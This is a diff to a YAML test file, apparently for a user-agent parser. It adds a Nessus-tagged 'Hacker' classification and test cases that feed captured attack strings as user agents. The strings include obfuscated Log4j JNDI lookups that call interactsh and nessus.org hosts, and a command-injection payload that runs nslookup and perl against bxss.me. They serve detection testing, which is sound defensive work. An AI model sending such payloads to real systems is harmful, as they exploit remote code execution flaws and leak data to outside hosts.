@@ -42,6 +42,33 @@ isCodeInjection: &isCodeInjection
       HackerToolkit                        : 'Unknown'
       RemarkablePattern                    : 'Hacker'
 
+isCodeInjectionNessus: &isCodeInjectionNessus
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Code Injection'
+      HackerToolkit                        : 'Nessus'
+      RemarkablePattern                    : 'Hacker'
+
 
 config:
 # Real attempts I got at home trying Apache Log4j RCE CVE-2021-44228
@@ -345,3 +372,17 @@ config:
       user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6r91da5aulgp8mfjcu0cg5kcnoyyj4qq.interactsh.com}'
     expected: *isCodeInjection
 
+- test:
+    input:
+      user_agent_string: '$(nslookup xxxxx.bxss.me||perl -e \"gethostbyname(''xxxxx.bxss.me'')\")'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://172.16.12.24:55184/nessus}'
+    expected: *isCodeInjectionNessus
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://log4shell-generic-xxxXXX123${lower:ten}.w.nessus.org/nessus}'
+    expected: *isCodeInjectionNessus
